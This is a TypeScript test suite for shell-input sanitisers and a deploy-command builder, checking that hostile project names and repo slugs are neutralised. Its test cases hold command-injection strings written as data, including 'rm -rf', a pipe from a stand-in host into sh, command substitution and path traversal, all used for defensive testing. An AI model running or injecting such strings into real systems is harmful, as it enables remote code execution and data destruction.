import assert from "node:assert/strict";
import { test } from "node:test";
import { shellToken, safeRepoSlug, buildCommandBundle } from "../src/lib/commands.ts";

// SECURITY: every value that reaches a shell command line goes through
// `shellToken`. These tests are the guarantee that a project name typed by any
// signed-in account cannot become an injected command.

test("shellToken refuses anything that is not a plain filename", () => {
  assert.equal(shellToken("my-site"), "my-site");
  assert.equal(shellToken("My_Site.v2"), "My_Site.v2");
  assert.equal(shellToken(""), "my-app");
  assert.equal(shellToken("   "), "my-app");
});

test("shellToken neutralises shell metacharacters", () => {
  // A project called this must NOT be able to run a second command.
  assert.equal(shellToken("site; rm -rf ~"), "my-app");
  assert.equal(shellToken("site && curl evil.com"), "my-app");
  assert.equal(shellToken("site\nwhoami"), "my-app");
  assert.equal(shellToken("site`id`"), "my-app");
  assert.equal(shellToken("site$(id)"), "my-app");
  assert.equal(shellToken("site|tee"), "my-app");
  assert.equal(shellToken("site > /etc/passwd"), "my-app");
  assert.equal(shellToken("site & calc"), "my-app");
  // Quotes would break out of the surrounding shell context.
  assert.equal(shellToken('site"x"'), "my-app");
  assert.equal(shellToken("site'x'"), "my-app");
  assert.equal(shellToken("site*"), "my-app");
  assert.equal(shellToken("site~"), "my-app");
  assert.equal(shellToken("site home"), "my-app");
});

test("shellToken refuses traversal and leading flags", () => {
  assert.equal(shellToken("../../etc/passwd"), "my-app");
  assert.equal(shellToken("a..b"), "my-app");
  // A leading dash would be parsed as a flag by git or zip.
  assert.equal(shellToken("-rf"), "my-app");
});

test("safeRepoSlug accepts only owner/repo", () => {
  assert.equal(safeRepoSlug("octocat/hello-world"), "octocat/hello-world");
  assert.equal(safeRepoSlug("  octocat/hello  "), "octocat/hello");
  assert.equal(safeRepoSlug("https://github.com/octocat/hello.git"), "octocat/hello");
});

test("safeRepoSlug rejects anything else", () => {
  assert.equal(safeRepoSlug(""), null);
  assert.equal(safeRepoSlug("no-slash"), null);
  assert.equal(safeRepoSlug("a/b/c"), null);
  assert.equal(safeRepoSlug("../../etc"), null);
  assert.equal(safeRepoSlug("octocat/hello; rm -rf /"), null);
  assert.equal(safeRepoSlug("octocat/hello world"), null);
  assert.equal(safeRepoSlug("octo cat/hello"), null);
});

test("buildCommandBundle keeps a hostile project name out of every command", () => {
  const hostile = "x; curl http://evil.com | sh";
  const bundle = buildCommandBundle(hostile, "vercel", "octocat/site");

  for (const entry of [...bundle.local, ...bundle.build, ...bundle.git, ...bundle.deploy]) {
    assert.ok(
      !entry.command.includes("curl") && !entry.command.includes("evil.com"),
      `injection leaked into: ${entry.command}`,
    );
  }
  // The whole script must be clean too.
  assert.ok(!bundle.allScript.includes("evil.com"));
});

test("buildCommandBundle uses the real project name when it is safe", () => {
  const bundle = buildCommandBundle("my-shop", "vercel", "octocat/site");
  assert.equal(bundle.local[0]!.command, "unzip my-shop.zip && cd my-shop");
});

test("buildCommandBundle emits exact git commands for a valid repo", () => {
  const bundle = buildCommandBundle("shop", "vercel", "octocat/site");
  const remote = bundle.git.find((e) => e.id === "git-remote");
  assert.equal(remote?.command, "git remote add origin https://github.com/octocat/site.git");
  assert.equal(remote?.blockedReason, undefined);
  assert.ok(bundle.git.some((e) => e.id === "git-push"));
});

test("buildCommandBundle flags the remote command when no repo is given", () => {
  const bundle = buildCommandBundle("shop", "vercel", "");
  const remote = bundle.git.find((e) => e.id === "git-remote");
  assert.ok(remote?.blockedReason, "a placeholder must be labelled, not silently wrong");
  assert.ok(remote.command.includes("OWNER/REPO"));
});

test("buildCommandBundle switches the deploy command by provider", () => {
  assert.equal(buildCommandBundle("s", "vercel").deploy[0]!.command, "npx vercel --prod");
  assert.equal(
    buildCommandBundle("s", "netlify").deploy[0]!.command,
    "npx netlify deploy --prod --dir=dist",
  );
});
